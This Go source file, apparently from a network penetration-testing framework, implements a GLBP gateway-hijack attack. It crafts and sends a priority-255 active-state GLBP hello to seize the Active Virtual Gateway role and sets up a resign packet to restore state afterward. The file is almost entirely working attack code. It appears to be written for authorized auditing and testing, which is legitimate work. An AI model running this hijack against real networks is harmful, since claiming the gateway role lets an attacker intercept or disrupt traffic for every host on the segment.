// glbp.go implements the GLBP virtual-router hijack attack behavior.
//
// Durability (from the catalog): temporary-restored. The attack sends a
// GLBP hello with a high priority (255) and the active state to claim the
// AVG (Active Virtual Gateway) role. The teardown arms a resign hello
// (lowered priority, listen state) to restore the virtual-router state.
//
// The baseline (l2l3-audit) does not carry a GLBP attack; the craft is
// authored from Wireshark's packet-glbp.c at commit
// 1dbb8baf9c5bb2e9501b15cce98cea6a3c0f41a3, lines 137-218 and 289-365.

package fh

import (
	"context"
	"encoding/json"
	"net"

	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"

	nl "go.aledante.io/FlowSeer/src/edge/netpen/layers"
	"go.aledante.io/FlowSeer/src/edge/netpen/runner"
)

type glbpFinding struct {
	Action   string `json:"action"`
	Group    uint16 `json:"group"`
	Priority uint8  `json:"priority"`
	State    string `json:"state"`
	Restore  string `json:"restore"`
}

// RunGLBP arms a resign teardown before sending a high-priority hello for
// the fixed fixture group. It requires the runner's teardown and emitter
// handles and returns craft or send errors with operation context.
func RunGLBP(ctx context.Context, deps runner.Deps) error {
	src := srcMAC()
	group := uint16(1)
	priority := uint8(255)

	// Arm the resign teardown before the first frame.
	resignPkt, err := craftGLBPHello(src, group, 100, nl.GLBPStateListen)
	if err != nil {
		return errs.Wrap(err, "glbp: craft resign")
	}
	deps.Teardown.Arm("glbp-resign", func(ctx context.Context) error {
		return deps.AttackLeg.Send(ctx, resignPkt)
	})

	// Send the hello to claim the active role.
	helloPkt, err := craftGLBPHello(src, group, priority, nl.GLBPStateActive)
	if err != nil {
		return errs.Wrap(err, "glbp: craft hello")
	}
	if err := deps.AttackLeg.Send(ctx, helloPkt); err != nil {
		return errs.Wrap(err, "glbp: send hello")
	}

	detail, _ := json.Marshal(glbpFinding{
		Action:   "glbp-hijack",
		Group:    group,
		Priority: priority,
		State:    "active",
		Restore:  "glbp-resign",
	})
	deps.Emitter.Finding("glbp", detail)

	return nil
}

// craftGLBPHello builds a GLBP hello: Ethernet → IPv4 → UDP(3222) → GLBP.
func craftGLBPHello(src net.HardwareAddr, group uint16, priority uint8, state nl.GLBPState) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       glbpDstMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: layers.IPProtocolUDP,
		SrcIP:    net.IPv4(10, 0, 0, 2),
		DstIP:    net.IPv4(224, 0, 0, 102),
	}
	udp := &layers.UDP{
		SrcPort: 3222,
		DstPort: 3222,
	}
	glbp := &nl.GLBP{
		Version:  1,
		Group:    group,
		OwnerMAC: src,
		TLVs: []nl.GLBPTLV{
			{
				Type: 1,
				Hello: &nl.GLBPHello{
					State:          state,
					Priority:       priority,
					HelloTime:      3000,
					HoldTime:       10000,
					AddressType:    1,
					AddressLength:  4,
					VirtualAddress: net.IPv4(10, 0, 0, 1).To4(),
				},
			},
		},
	}
	return craftUDPLayer(eth, ip, udp, glbp)
}
